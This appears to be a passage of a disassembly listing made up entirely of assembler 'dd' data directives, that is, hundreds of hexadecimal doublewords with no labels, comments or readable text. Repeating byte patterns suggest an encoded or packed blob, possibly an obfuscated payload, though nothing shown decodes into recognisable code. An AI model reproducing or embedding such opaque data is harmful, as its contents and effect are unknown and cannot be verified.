		dd 80EFEDB6h, 7D00E4FFh, 6FFD02F3h, 0EFFD00h, 0FD0153F1h
		dd 0EFFCBB03h, 0EE412Ch, 0FD0150FDh, 0EFFCBE03h, 0EE439Eh
		dd 0FD0151ADh, 0EFFCBD13h, 0EE40AAh, 0FD0152AFh, 0EFFCBDE7h
		dd 0EE41ACh, 0FD0153A1h, 0EFFCBCABh, 0EFFD00h, 0FD012ED1h
		dd 0EFFCBB89h, 0EE3C22h, 0FD015421h, 0EFFCBB3Fh, 0EE46B8h
		dd 0FD015453h, 0EFFCBB4Fh, 0EE4682h, 0FD015485h, 0EFFCBB81h
		dd 0EE3C38h, 0FD0154A3h, 0EFFCBBB9h, 0EE464Ch, 0FD0154BFh
		dd 0EFFCBBC3h, 0EE4624h, 0FD0154E1h, 0EFFCBBFDh, 0EE4602h
		dd 0FD015505h, 0EFFCBA07h, 0EE47D4h, 0FD015531h, 0EFFCBA57h
		dd 0EE47AEh, 0FD01555Bh, 0EFFCBA73h, 0EE4792h, 0FD015575h
		dd 0EFFD00EFh, 0EE472Ch, 0FD0155CBh, 0EFFCBAA5h, 0EE44E2h
		dd 0FD015605h, 0EFFCBAFDh, 0EE4722h, 0FD00EFFDh, 0EFFCC029h
		dd 0EE3DAEh, 0FD00EFFDh, 0EFFCB9E7h, 0EE4422h, 0FD0156C9h
		dd 0EFFD00EFh, 0EE4E38h, 0FD01596Dh, 0EFFCB3FDh, 0EE4E1Eh
		dd 0FD01597Fh, 0EFFCB3A1h, 0EE4E68h, 0FD015C8Bh, 0EFFCB363h
		dd 0EE4E9Ch, 0FD015C4Dh, 0EFFCB32Bh, 0EE4ED0h, 0FD015C1Fh
		dd 0EFFCB317h, 0EE490Ch, 0FD015BE7h, 0EFFCB4C7h, 0EE4936h
		dd 0FD015BB9h, 0EFFCB4BBh, 0EE4962h, 0FD015B87h, 0EFFCB465h
		dd 0EE4998h, 0FD015B57h, 0EFFCB457h, 0EE49CAh, 0FD015B27h
		dd 0EFFCB407h, 0EE49FAh, 0FD015AF3h, 0EFFCB5CFh, 0EE4830h
		dd 0FD01598Dh, 0EFFCB68Fh, 0EE4B50h, 0FD0159C1h, 0EFFCB6CFh
		dd 0EE4B0Ch, 0FD015A05h, 0EFFCB507h, 0EE48D6h, 0FD015A47h
		dd 0EFFCB545h, 0EE489Ah, 0FD015A77h, 0EFFCB591h, 0EE486Ah
		dd 0FD015A9Fh, 0EFFCB5B7h, 0EE4844h, 0FD00EFFDh, 0EFFCB97Fh
		dd 0EE447Ch, 0FD015695h, 0EFFCB9BDh, 0EFFD00h, 0FD012F9Dh
		dd 0EFFCBFB9h, 0EE4266h, 0FD01507Dh, 0EFFCBF7Fh, 0EE429Eh
		dd 0FD01504Bh, 0EFFCBF2Bh, 0EE42E2h, 0FD01500Dh, 0EFFCC0EDh
		dd 0EE3D18h, 0FD012FDBh, 0EFFCC0D5h, 0EE3D52h, 0FD01502Fh
		dd 0EFFD00EFh, 80EFFD39h, 7D00EFFBh, 6FFD0080h,	80EFFD0Ch
		dd 0FD012F77h, 6FFD00E7h, 80EFFD14h, 7D00EFF6h,	6FFD00FCh
		dd 80EFFD12h, 7D00EFFEh, 6FFD00FFh, 80EFFD0Fh, 7D00EFEAh
		dd 6FFD00DBh, 80EFFD09h, 7D00EFF9h, 6FFD00FAh, 80EFFD74h
		dd 0FD012F83h, 6FFD009Ch, 0EFFD00h, 0FD012F1Bh,	0EFFCC019h
		dd 0EFFD00h, 0FD00EFFDh, 0FFFD21AFh, 10EFD8F0h,	0ED00C84Dh
		dd 0FFFD28AFh, 0EFFD00h, 0C250EFFDh, 0FFFD2C4Fh, 0EFFD00h
		dd 0FD00EFFDh, 0AFD500EFh, 939B416Ah, 0C2F0EBE5h, 0FFFD39FFh
		dd 10EFB8E0h, 0ED00A8DDh, 0FFFD48AFh, 0FF1002FFh, 0ED00A55Ah
		dd 0FFFD4A42h, 10EF6070h, 0ED00706Dh, 0FFFDA9EFh, 10EF5600h
		dd 0ED0043EDh, 0FFFDACBFh, 0EFFD00h, 2FF1002h, 0EFFD00EFh
		dd 10EF4C4Fh, 0FD00EFFDh, 1002FF10h, 0EFFD00h, 0ED005CC6h
		dd 0FFFDB58Fh, 10EF4A80h, 0ED005ADDh, 0FFFDC2AFh, 10EF31E0h
		dd 0ED00222Dh, 0FFFDCF7Fh, 10EF32C0h, 0FD00EFFDh, 1002FF10h
		dd 0EFFD00h, 0ED0036E6h, 0FFFDDD6Fh, 10EF1CF0h,	0ED000DADh
		dd 0FFFDE79Fh, 0EFFA60h, 0FD50E7FDh, 0EFED08EFh, 9CF514h
		dd 0FD1FE8EFh, 0EF8D08EFh, 0DFF500h, 0FDC0E6FDh, 0EFF707FFh
		dd 8FF500h, 0FD20E7FDh,	0EF5D09EFh, 0EFF500h, 0FD80E7FDh
		dd 0EFBD08EFh, 0FF400h,	0FD06E8EDh, 0EFA508EFh,	0F7F500h
		dd 0FD90E6FDh, 0EFC607FCh, 97F500h, 0FD38E7FDh,	0EF2D09EFh
		dd 0FEFA11h, 0FD68E7FDh, 0EFD508EFh, 5FF400h, 0FD08E7FDh
		dd 0EF7508EFh, 0A7F500h, 0FDF0E6FDh, 0EFF907FFh, 0BBF500h
		dd 0FD14E7FDh, 0EF1E08FAh, 0C4FA13h, 0FD74E7FDh, 0EFC908EFh
		dd 27F400h, 0FD0DE8ECh,	0EF9908EFh, 0CBF500h, 0FDA8E6FDh
		dd 0EFF908EFh, 6BF500h,	0FD44E7FDh, 0EF1509EFh,	0E7FA10h
		dd 0FD5CE7FDh, 0EFE108EFh, 77F400h, 0FD53E8E9h,	0EF8108EFh
		dd 0D3F500h, 0FDD8E6FDh, 0EFEA07FDh, 83F500h, 0FD2CE7FDh
		dd 0EF4509EFh, 0E3F500h, 0FD8CE7FDh, 0EFB108EFh, 17F400h
		dd 0FD03E8EDh, 0EFAF08EFh, 0FDF500h, 0FDA3E7E8h, 0EFDE07FCh
		dd 9DF500h, 0FD32E7FDh,	0EF3909EFh, 0E4FA11h, 0FD62E7FDh
		dd 0EFDF08EFh, 4BF400h,	0FD02E7FDh, 0EF7F08EFh,	0ADF500h
		dd 0FDE4E6FDh, 0EFFA07FFh, 0B5F500h, 0FD1AE7FDh, 0EF6909EFh
		dd 0ACFA14h, 0FD7AE7FDh, 0EFC708EFh, 3BF400h, 0FD13E8EFh
		dd 0EF9708EFh, 0C5F500h, 0FDB4E6FDh, 0EFF708EFh, 65F500h
		dd 0FD4AE7FDh, 0EF0909EFh, 0EAFA10h, 0FD56E7FDh, 0EFEB08EFh
		dd 0EFF540h, 0FD33E8EEh, 0EF8B08EFh, 0D9F500h, 0FDCCE6FDh
		dd 0EFF207FEh, 89F500h,	0FD26E7FDh, 0EF5109EFh,	0E9F500h
		dd 0FD86E7FDh, 0EFBB08EFh, 3F400h, 0FD09E8EDh, 0EFA308EFh
		dd 0F1F500h, 0FD9CE6FDh, 0EF9E07FBh, 91F500h, 0FD3EE7FDh
		dd 0EF2109EFh, 0F4FA12h, 0FD6EE7FDh, 0EFD308EFh, 53F400h
		dd 0FD0EE7FDh, 0EF7308EFh, 0A1F500h, 0FDFCE6FDh, 0EFFD078Fh
		dd 0BEF500h, 0FD11E7FDh, 0EF7E08FAh, 0F0FA12h, 0FD71E7FDh
		dd 0EFCC08EFh, 2DF400h,	0FD0AE8EDh, 0EF9C08EFh,	0CEF500h
		dd 0FDA2E6FDh, 0EFFC08EFh, 6EF500h, 0FD41E7FDh,	0EF1F09EFh
		dd 0E9FA10h, 0FD59E7FDh, 0EFE408EFh, 7DF400h, 0FD3BE8EEh
		dd 0EF8408EFh, 0D6F500h, 0FDD2E6FDh, 0EFEC07FEh, 86F500h
		dd 0FD29E7FDh, 0EF4F09EFh, 0E6F500h, 0FD89E7FDh, 0EFB408EFh
		dd 1DF400h, 0FD04E8EDh,	0EFA808EFh, 0FAF500h, 0FC02E7EDh
		dd 0EFD607FCh, 9AF500h,	0FD35E7FDh, 0EF3709EFh,	0E2FA11h
		dd 0FD65E7FDh, 0EFD808EFh, 45F400h, 0FD05E7FDh,	0EF7808EFh
		dd 0AAF500h, 0FDEAE6FDh, 0EFF507FFh, 0B2F500h, 0FD1DE7FDh
		dd 0EF6709EFh, 0BCFA14h, 0FD7DE7FDh, 0EFC008EFh, 35F400h
		dd 0FD17E8EFh, 0EF9008EFh, 0C2F500h, 0FDBAE6FDh, 0EFF008EFh
		dd 62F500h, 0FD4DE7FDh,	0EF0709EFh, 0ECFA10h, 0FD53E7FDh
		dd 0EFEE08EFh, 2CF515h,	0FD23E8EEh, 0EF8E08EFh,	0DCF500h
		dd 0FDC6E6FDh, 0EFF607FEh, 8CF500h, 0FD23E7FDh,	0EF5B09EFh
		dd 0ECF500h, 0FD83E7FDh, 0EFBE08EFh, 9F400h, 0FD07E8EDh
		dd 0EFA608EFh, 0F4F500h, 0FD96E6FDh, 0EFBE07FBh, 94F500h
		dd 0FD3BE7FDh, 0EF2B09EFh, 0FCFA12h, 0FD6BE7FDh, 0EFD608EFh
		dd 59F400h, 0FD0BE7FDh,	0EF7608EFh, 0A4F500h, 0FDF6E6FDh
		dd 0EFF807FFh, 0B8F500h, 0FD17E7FDh, 0EFFD08AFh, 0DCFA13h
		dd 0FD77E7FDh, 0EFCA08EFh, 21F400h, 0FD0FE8ECh,	0EF9A08EFh
		dd 0C8F500h, 0FDAEE6FDh, 0EFFA08EFh, 68F500h, 0FD47E7FDh
		dd 0EF1309EFh, 0E6FA10h, 0FD5FE7FDh, 0EFE208EFh, 71F400h
		dd 0FD63E8E9h, 0EF8208EFh, 0D0F500h, 0FDDEE6FDh, 0EFE607FDh
		dd 80F500h, 0FD2FE7FDh,	0EF4309EFh, 0E0F500h, 0FD8FE7FDh
		dd 0EFB208EFh, 11F400h,	0FD00E89Dh, 0EFAD08EFh,	0FFF500h
		dd 0FD73E7E9h, 0EFE207FDh, 9FF500h, 0FD30E7FDh,	0EF3C09EFh
		dd 0E5FA10h, 0FD60E7FDh, 0EFDD08EFh, 4EF400h, 0FD00E7FDh
		dd 0EF7D08EFh, 0AFF500h, 0FDE1E6FDh, 0EFFB07FFh, 0B7F500h
		dd 0FD18E7FDh, 0EF6C09EFh, 0D4FA13h, 0FD78E7FDh, 0EFC508EFh
		dd 3EF400h, 0FD11E8ECh
		dd 0EF9508EFh, 0C7F500h, 0FDB1E6FDh, 0EFF508EFh, 67F500h
		dd 0FD48E7FDh, 0EF0C09EFh, 0EBFA10h, 0FD54E7FDh, 0EFE908EFh
		dd 0CF515h, 0FD2BE8EEh,	0EF8908EFh, 0DBF500h, 0FDC9E6FDh
		dd 0EFF007FEh, 8BF500h,	0FD24E7FDh, 0EF5409EFh,	0EBF500h
		dd 0FD84E7FDh, 0EFB908EFh, 6F400h, 0FD08E8EDh, 0EFA108EFh
		dd 0F3F500h, 0FD99E6FDh, 0EFAE07FBh, 93F500h, 0FD3CE7FDh
		dd 0EF2409EFh, 0F8FA12h, 0FD6CE7FDh, 0EFD108EFh, 56F400h
		dd 0FD0CE7FDh, 0EF7108EFh, 0A3F500h, 0FDF9E6FDh, 0EFFE07FFh
		dd 0BDF500h, 0FD12E7FDh, 0EF5E08FAh, 0CCFA13h, 0FD72E7FDh
		dd 0EFCF08EFh, 2AF400h,	0FD0BE8ECh, 0EF9F08EFh,	0CDF500h
		dd 0FDA5E6FDh, 0EFFF08EFh, 6DF500h, 0FD42E7FDh,	0EF1809EFh
		dd 0E8FA10h, 0FD5AE7FDh, 0EFE708EFh, 7AF400h, 0FD43E8E9h
		dd 0EF8708EFh, 0D5F500h, 0FDD5E6FDh, 0EFEE07FDh, 85F500h
		dd 0FD2AE7FDh, 0EF4809EFh, 0E5F500h, 0FD8AE7FDh, 0EFB708EFh
		dd 1AF400h, 0FD05E8EDh,	0EFAB08EFh, 0F9F500h, 0FD00E7BDh
		dd 0EFCE07FCh, 99F500h,	0FD36E7FDh, 0EF3009EFh,	0E0FA11h
		dd 0FD66E7FDh, 0EFDB08EFh, 42F400h, 0FD06E7FDh,	0EF7B08EFh
		dd 0A9F500h, 0FDEDE6FDh, 0EFF407FFh, 0B1F500h, 0FD1EE7FDh
		dd 0EF6009EFh, 8CFA14h,	0FD7EE7FDh, 0EFC308EFh,	32F400h
		dd 0FD1BE8EFh, 0EF9308EFh, 0C1F500h, 0FDBDE6FDh, 0EFF308EFh
		dd 61F500h, 0FD4EE7FDh,	0EF0009EFh, 0EFFA60h, 0FD51E7FDh
		dd 0EFEC08EFh, 6CF515h,	0FD1FE8EFh, 0EF8C08EFh,	0DEF500h
		dd 0FDC3E6FDh, 0EFF707FFh, 8EF500h, 0FD21E7FDh,	0EF5E09EFh
		dd 0EEF500h, 0FD81E7FDh, 0EFBC08EFh, 0CF400h, 0FD06E8EDh
		dd 0EFA408EFh, 0F6F500h, 0FD93E6FDh, 0EFC607FCh, 96F500h
		dd 0FD39E7FDh, 0EF2E09EFh, 0FEFA11h, 0FD69E7FDh, 0EFD408EFh
		dd 5CF400h, 0FD09E7FDh,	0EF7408EFh, 0A6F500h, 0FDF3E6FDh
		dd 0EFF907FFh, 0BAF500h, 0FD15E7FDh, 0EEFF08FFh, 0C4FA13h
		dd 0FD75E7FDh, 0EFC808EFh, 24F400h, 0FD0DE8ECh,	0EF9808EFh
		dd 0CAF500h, 0FDABE6FDh, 0EFF808EFh, 6AF500h, 0FD45E7FDh
		dd 0EF1609EFh, 0E7FA10h, 0FD5DE7FDh, 0EFE008EFh, 74F400h
		dd 0FD53E8E9h, 0EF8008EFh, 0D2F500h, 0FDDBE6FDh, 0EFEA07FDh
		dd 82F500h, 0FD2DE7FDh,	0EF4609EFh, 0E2F500h, 0FD8DE7FDh
		dd 0EFB008EFh, 14F400h,	0FD03E8EDh, 0EFAE08EFh,	0FCF500h
		dd 0FDC3E7E8h, 0EFDE07FCh, 9CF500h, 0FD33E7FDh,	0EF3A09EFh
		dd 0E4FA11h, 0FD63E7FDh, 0EFDE08EFh, 48F400h, 0FD03E7FDh
		dd 0EF7E08EFh, 0ACF500h, 0FDE7E6FDh, 0EFFA07FFh, 0B4F500h
		dd 0FD1BE7FDh, 0EF6A09EFh, 0ACFA14h, 0FD7BE7FDh, 0EFC608EFh
		dd 38F400h, 0FD13E8EFh,	0EF9608EFh, 0C4F500h, 0FDB7E6FDh
		dd 0EFF608EFh, 64F500h,	0FD4BE7FDh, 0EF0A09EFh,	0EAFA10h
		dd 0FD57E7FDh, 0EFEA08EFh, 0EFF540h, 0FD33E8EEh, 0EF8A08EFh
		dd 0D8F500h, 0FDCFE6FDh, 0EFF207FEh, 88F500h, 0FD27E7FDh
		dd 0EF5209EFh, 0E8F500h, 0FD87E7FDh, 0EFBA08EFh, 0F400h
		dd 0FD09E8EDh, 0EFA208EFh, 0F0F500h, 0FD9FE6FDh, 0EF9E07FBh
		dd 90F500h, 0FD3FE7FDh,	0EF2209EFh, 0F4FA12h, 0FD6FE7FDh
		dd 0EFD208EFh, 50F400h,	0FD0FE7FDh, 0EF7208EFh,	0A0F500h
		dd 0FDFFE6FDh, 0EFFC05FFh, 1EEF817h, 0FD11EAEEh, 0FFFC05F4h
		dd 0EAF811h, 0F901EAE4h, 0EFBC05FAh, 40EEF81Dh,	0FD03EAEDh
		dd 0EDFC05F7h, 0CEF814h, 0DD01EAE1h, 0EFF405FDh, 8EEF81Ah
		dd 0FD81EAEBh, 0EFFD05AFh, 0EDF810h, 0FC81EAEAh, 0EFE405FCh
		dd 18EEF81Bh, 0FD07EAECh, 0E9FC05F6h, 8EF815h, 9D01EAE0h
		dd 0EFF905FFh, 3EEF818h, 0FD31EAE9h, 0DFFC05F3h, 0E2F812h
		dd 0F101EAE7h, 0EF3C05F9h, 0EFF840h, 0FD11EFEDh, 0EFFD00FDh
		dd 0E8FD08h, 0FD06EFF4h, 0EFF800E5h, 0EBFD0Bh, 0FD03EFF1h
		dd 0EFFF00E2h, 0EEFD0Eh, 0FD00EFF2h, 0EFFD00EFh, 668A9920h
		dd 98748E91h, 0DDD331CFh, 43CFC82Eh, 8F799F92h,	9B956786h
		dd 39D6CC20h, 0CD32C2C8h, 0A5DD30DEh, 2D819C65h, 8D758091h
		dd 869C47CFh, 2096916Ch, 0DD64819Ch, 848F61A2h,	6C8BBC20h
		dd 0FD209D98h, 0EFFD00EFh, 0EFFD00h, 0FD00EFFDh, 0FFFC134Fh
		dd 0EBFD04h, 0FD04EFF5h, 0FFFC17CFh, 0EAFD04h, 0FD08EFEDh
		dd 0FFFC17CFh, 0E9FD04h, 0FD20EFDDh, 0FFFC17CFh, 0EBFD04h
		dd 0FD10EFEDh, 0FFFC1B3Fh, 0FFFD08h, 0FD20EFDDh, 0FFFC1B3Fh
		dd 0FFFD08h, 0FD80EF7Dh, 0FFFC1B3Fh, 0CFFD08h, 0FC00EF7Dh
		dd 0FFFC1B3Fh, 6FFD20h,	0F900EEFFh, 0FFFC1B3Fh,	1EDFD20h
		dd 0ED00EEFFh, 0FFFC1B3Fh, 2EDDD331h, 0FD00EFC8h, 0FFFCE2F3h
		dd 10EE1F10h, 0ED010D59h, 0FFFCE2EBh, 10EE1CF4h, 0ED010E15h
		dd 0FFFCE13Bh, 10EE1CC4h, 0ED010E51h, 0FFFCE24Bh, 66819420h
		dd 98748E91h, 0DDD331CFh, 43CFC82Eh, 8F799F92h,	9B956786h
		dd 39D6CC20h, 0CD32C2C8h, 0A2DD30DEh, 20848F61h, 986C8BBCh
		dd 0EFFD209Dh, 0EBFD03h, 0FD06EFF8h, 0EFF500E8h, 0E5FD09h
		dd 0FD0DEFF6h, 0EFEC00E0h, 0F8FD13h, 0FD1FEFE6h, 0EFD600CCh
		dd 0D4FD33h, 0FD53EFBEh, 0EF8E008Ch, 4CFD83h, 0FDE3EF3Eh
		dd 0EFFD01EDh, 0EFFD00h, 0FD10EFEDh, 0EFED00FFh, 0FFFD10h
		dd 0FD10EFEDh, 0EFEC00FEh, 0FEFD11h, 0FD12EFEFh, 0EFEF00FDh
		dd 0FCFD13h, 0FD13EFEEh, 0EFE900FBh, 0FBFD14h, 0FD15EFE8h
		dd 0EFE800FAh, 0A6FD10h, 0FD00EF3Eh, 0EFFF00EEh, 0EBFD03h
		dd 0FD07EFF8h, 0EFF000E6h, 0F6FD11h, 0FD31EFDCh, 0EF9C00AEh
		dd 2EFD81h, 0FC81EEFCh,	0ECFC02EEh, 6EEF901h, 0F101E7FCh
		dd 0F7FC10EEh, 30EEDD01h, 9D01AFFCh, 0EFFD00EFh, 0FFFD10h
		dd 0FD10EFEDh, 0EFEC00FEh, 0FDFD12h, 0FD13EFEEh, 0EFE900FBh
		dd 0FAFD15h, 0FD16EFEBh, 0EFEA00F8h, 0F7FD18h, 0FD19EFE4h
		dd 0EFE700F5h, 0F4FD1Bh, 0FD1CEFE1h, 0EFE000F2h, 0AFFD40h
		dd 0FD00EFFDh, 98FA3079h, 0EEE19C2Ch, 6409BE47h, 0E890C4F6h
		dd 7085098Fh, 14634AC8h, 7199954Ch, 0E347532h, 84DC5759h
		dd 0F28E9F1h, 973D2488h, 0F4B6A3D6h, 914C7C52h,	0E757D007h
		dd 6DBFF26Ch, 0F24A108Bh, 6A5FDDF2h, 0EB99EB5h,	6B434131h
		dd 1A35297Dh, 90DD0B16h, 1B29B5BEh, 833C78C7h, 0EE6C77ABh
		dd 8B96A82Fh, 0FD8D047Ah, 77652611h, 0FBFC5CA0h, 63E991D9h
		dd 70FD29Eh, 62F50D1Ah,	3B81DDC8h, 0B169FFA3h, 3A9D410Bh
		dd 0A2888C72h, 0C1030B2Ch, 0A4F9D4A8h, 0D2E278FDh, 580A5A96h
		dd 0DA48A815h, 425D656Ch, 26BB262Bh, 4341F9AFh,	323791E3h
		dd 0B8DFB388h, 332B0D20h, 0AB3EC059h, 0DBD9DF51h, 0BE2300D5h
		dd 0C838AC80h, 42D08EEBh, 0CE49F45Ah, 565C3923h, 32BA7A64h
		dd 5740A5E0h, 28ED459Eh, 0A20567F5h, 29F1D95Dh,	0B1E41424h
		dd 0D26F937Ah, 0B7954CFEh, 0C18EE0ABh, 4B66C2C0h, 9921417Fh
		dd 1348C06h, 65D2CF41h,	2810C5h, 715E7889h, 0FBB65AE2h
		dd 7042E44Ah, 0E8572933h, 8507265Fh, 0E0FDF9DBh, 96E6558Eh
		dd 1C0E77E5h, 90970D54h, 882C02Dh, 6C64836Ah, 99E5CEEh
		dd 6B84ACF4h, 0E16C8E9Fh, 6A983037h, 0F28DFD4Eh, 91067A10h
		dd 0F4FCA594h, 82E709C1h, 80F2BAAh, 8A4DD929h, 12581450h
		dd 76BE5717h, 13448893h, 6232E0DFh, 0E8DAC2B4h,	632E7C1Ch
		dd 0FB3BB165h, 0B0B28EA5h, 0D5485121h, 0A353FD74h, 29BBDF1Fh
		dd 0A522A5AEh, 3D3768D7h
		dd 59D12B90h, 3C2BF414h, 4386146Ah, 0C96E3601h,	429A88A9h
		dd 0DA8F45D0h, 0B904C28Eh, 0DCFE1D0Ah, 0AAE5B15Fh, 200D9334h
		dd 0BFF871D3h, 27EDBCAAh, 430BFFEDh, 26F12069h,	57874825h
		dd 0DD6F6A4Eh, 569BD4E6h, 0CE8E199Fh, 0A3DE16F3h, 0C624C977h
		dd 0B03F6522h, 3AD74749h, 0B64E3DF8h, 2E5BF081h, 4ABDB3C6h
		dd 2F476C42h, 0ED577E20h, 67BF5C4Bh, 0EC4BE2E3h, 745E2F9Ah
		dd 17D5A8C4h, 722F7740h, 434DB15h, 8EDCF97Eh, 0C9E0BFDh
		dd 948BC684h, 0F06D85C3h, 95975A47h, 0E4E1320Bh, 6E091060h
		dd 0E5FDAEC8h, 7DE863B1h, 0D0F7CB9h, 68F5A33Dh,	1EEE0F68h
		dd 94062D03h, 189F57B2h, 808A9ACBh, 0E46CD98Ch,	81960608h
		dd 0FE3BE676h, 74D3C41Dh, 0FF277AB5h, 6732B7CCh, 4B93092h
		dd 6143EF16h, 17584343h, 9DB06128h, 392BA307h, 0A13E6E7Eh
		dd 0C5D82D39h, 0A022F2BDh, 0D1549AF1h, 5BBCB89Ah, 0D0480632h
		dd 485DCB4Bh, 250DC427h, 40F71BA3h, 36ECB7F6h, 0BC04959Dh
		dd 309DEF2Ch, 0A8882255h, 0CC6E6112h, 0A994BE96h, 0CB8E4E8Ch
		dd 41666CE7h, 0CA92D24Fh, 52871F36h, 310C9868h,	54F647ECh
		dd 22EDEBB9h, 0A805C9D2h, 2A473B51h, 0B252F628h, 0D6B4B56Fh
		dd 0B34E6AEBh, 0C23802A7h, 48D020CCh, 0C3249E64h, 5B31531Dh
		dd 66642D4Dh, 39EF2C9h,	75855E9Ch, 0FF6D7CF7h, 73F40646h
		dd 0EBE1CB3Fh, 8F078878h, 0EAFD57FCh, 9550B782h, 1FB895E9h
		dd 944C2B41h, 0C59E638h, 6FD26166h, 0A28BEE2h, 7C3312B7h
		dd 0F6DB30DCh, 692ED23Bh, 0F13B1F42h, 95DD5C05h, 0F0278381h
		dd 8151EBCDh, 0BB9C9A6h, 804D770Eh, 1858BA77h, 7508B51Bh
		dd 10F26A9Fh, 66E9C6CAh, 0EC01E4A1h, 60989E10h,	0F88D5369h
		dd 9C6B102Eh, 0F991CFAAh, 0A0E51F78h, 2A0D3D13h, 0A1F983BBh
		dd 39EC4EC2h, 5A67C99Ch, 3F9D1618h, 4986BA4Dh, 0C36E9826h
		dd 412C6AA5h, 0D939A7DCh, 0BDDFE49Bh, 0D8253B1Fh, 0A9535353h
		dd 23BB7138h, 0A84FCF90h, 305A02E9h, 40BD1DE1h,	2547C265h
		dd 535C6E30h, 0D9B44C5Bh, 552D36EAh, 0CD38FB93h, 0A9DEB8D4h
		dd 0CC246750h, 0B389872Eh, 3961A545h, 0B2951BEDh, 2A80D694h
		dd 490B51CAh, 2CF18E4Eh, 5AEA221Bh, 0D0020070h,	0EFFD00EFh
		dd 19F4CC41h, 0CF368D7Fh, 0C4D0532Ch, 64833804h, 80771BB8h
		dd 0B9A7A769h, 4FAE6BC7h, 35D965F5h, 3E3FBBA6h,	0FA00158Ah
		dd 1EF43636h, 43484FE3h, 0B541834Dh, 6383C273h,	68651C20h
		dd 4A2DEF51h, 0AED9CCEDh, 9709703Ch, 6100BC92h,	0D3AE38A8h
		dd 0D848E6FBh, 1C7748D7h, 0F8836B6Bh, 6DE698B6h, 9BEF5418h
		dd 4D2D1526h, 46CBCB75h, 0E698A05Dh, 26C83E1h, 3BBC3F30h
		dd 0CDB5F39Eh, 6884CB5Fh, 6362150Ch, 0A75DBB20h, 43A9989Ch
		dd 1E15E149h, 0E81C2DE7h, 3EDE6CD9h, 3538B28Ah,	5DB253AAh
		dd 0B9467016h, 8096CCC7h, 769F0069h, 0C4318453h, 0CFD75A00h
		dd 0BE8F42Ch, 0EF1CD790h, 30BB361Ch, 0C6B2FAB2h, 1070BB8Ch
		dd 1B9665DFh, 0BBC50EF7h, 5F312D4Bh, 66E1919Ah,	90E85D34h
		dd 0EA9F5306h, 0E1798D55h, 25462379h, 0C1B200C5h, 9C0E7910h
		dd 6A07B5BEh, 0BCC5F480h, 0B7232AD3h, 0F096B205h, 146291B9h
		dd 2DB22D68h, 0DBBBE1C6h, 691565FCh, 62F3BBAFh,	0A6CC1583h
		dd 4238363Fh, 0D75DC5E2h, 2154094Ch, 0F7964872h, 0FC709621h
		dd 5C23FD09h, 0B8D7DEB5h, 81076264h, 770EAECAh,	47BBB2A9h
		dd 4C5D6CFAh, 8862C2D6h, 6C96E16Ah, 312A98BFh, 0C7235411h
		dd 11E1152Fh, 1A07CB7Ch, 728D2A5Ch, 967909E0h, 0AFA9B531h
		dd 59A0799Fh, 0EB0EFDA5h, 0E0E823F6h, 24D78DDAh, 0C023AE66h
		dd 8A006B48h, 7C09A7E6h, 0AACBE6D8h, 0A12D388Bh, 17E53A3h
		dd 0E58A701Fh, 0DC5ACCCEh, 2A530060h, 50240E52h, 5BC2D001h
		dd 9FFD7E2Dh, 7B095D91h, 26B52444h, 0D0BCE8EAh,	67EA9D4h
		dd 0D987787h, 2FD084F6h, 0CB24A74Ah, 0F2F41B9Bh, 4FDD735h
		dd 0B653530Fh, 0BDB58D5Ch, 798A2370h, 9D7E00CCh, 81BF311h
		dd 0FE123FBFh, 28D07E81h, 2336A0D2h, 8365CBFAh,	6791E846h
		dd 5E415497h, 0A8489839h, 0C68377B6h, 0CD65A9E5h, 95A07C9h
		dd 0EDAE2475h, 0B0125DA0h, 461B910Eh, 90D9D030h, 9B3F0E63h
		dd 0F3B5EF43h, 1741CCFFh, 2E91702Eh, 0D898BC80h, 6A3638BAh
		dd 61D0E6E9h, 0A5EF48C5h, 411B6B79h, 9EBC8AF5h,	68B5465Bh
		dd 0BE770765h, 0B591D936h, 15C2B21Eh, 0F13691A2h, 0C8E62D73h
		dd 3EEFE1DDh, 4498EFEFh, 4F7E31BCh, 8B419F90h, 6FB5BC2Ch
		dd 3209C5F9h, 0C4000957h, 12C24869h, 1924963Ah,	0AEE841E9h
		dd 4A1C6255h, 73CCDE84h, 85C5122Ah, 376B9610h, 3C8D4843h
		dd 0F8B2E66Fh, 1C46C5D3h, 8923360Eh, 7F2AFAA0h,	0A9E8BB9Eh
		dd 0A20E65CDh, 25D0EE5h, 0E6A92D59h, 0DF799188h, 29705D26h
		dd 19C54145h, 12239F16h, 0D61C313Ah, 32E81286h,	6F546B53h
		dd 995DA7FDh, 4F9FE6C3h, 44793890h, 2CF3D9B0h, 0C807FA0Ch
		dd 0F1D746DDh, 7DE8A73h, 0B5700E49h, 0BE96D01Ah, 7AA97E36h
		dd 9E5D5D8Ah, 2407D7A1h, 0D20E1B0Fh, 4CC5A31h, 0F2A8462h
		dd 0AF79EF4Ah, 4B8DCCF6h, 725D7027h, 8454BC89h,	0FE23B2BBh
		dd 0F5C56CE8h, 31FAC2C4h, 0D50EE178h, 88B298ADh, 7EBB5403h
		dd 0A879153Dh, 0A39FCB6Eh, 81D7381Fh, 65231BA3h, 5CF3A772h
		dd 0AAFA6BDCh, 1854EFE6h, 13B231B5h, 0D78D9F99h, 3379BC25h
		dd 0A61C4FF8h, 50158356h, 86D7C268h, 8D311C3Bh,	2D627713h
		dd 0C99654AFh, 0F046E87Eh, 64F24D0h, 0A37E1C11h, 0A898C242h
		dd 6CA76C6Eh, 88534FD2h, 0D5EF3607h, 23E6FAA9h,	0F524BB97h
		dd 0FEC265C4h, 964884E4h, 72BCA758h, 4B6C1B89h,	0BD65D727h
		dd 0FCB531Dh, 42D8D4Eh,	0C0122362h, 24E600DEh, 0FB41E152h
		dd 0D482DFCh, 0DB8A6CC2h, 0D06CB291h, 703FD9B9h, 94CBFA05h
		dd 0AD1B46D4h, 5B128A7Ah, 21658448h, 2A835A1Bh,	0EEBCF437h
		dd 0A48D78Bh, 57F4AE5Eh, 0A1FD62F0h, 773F23CEh,	7CD9FD9Dh
		dd 0EFFD00h, 0FCC285CAh, 0EC79D481h, 2A94359h, 0FA094721h
		dd 0E936C204h, 46281B2h, 0F84FF978h, 0E1EE5157h, 0F3EC68Fh
		dd 0F0976A2Bh, 0E3A8EF0Eh, 9F50464h, 0F5D87CAEh, 0E5632DE5h
		dd 0BB3BA3Dh, 0E1264C8Dh, 0F219C9A8h, 1F4D8A1Eh, 0E360F2D4h
		dd 0F4D20B43h, 1A029C9Bh, 0E5AB303Fh, 0F694B51Ah, 12DA0FC8h
		dd 0EEF77702h, 0FE4C2649h, 109CB191h, 0E83CB5E9h, 0FB0330CCh
		dd 1657737Ah, 0EA7A0BB0h, 0D7B0460Fh, 3960D1D7h, 0C6C97D73h
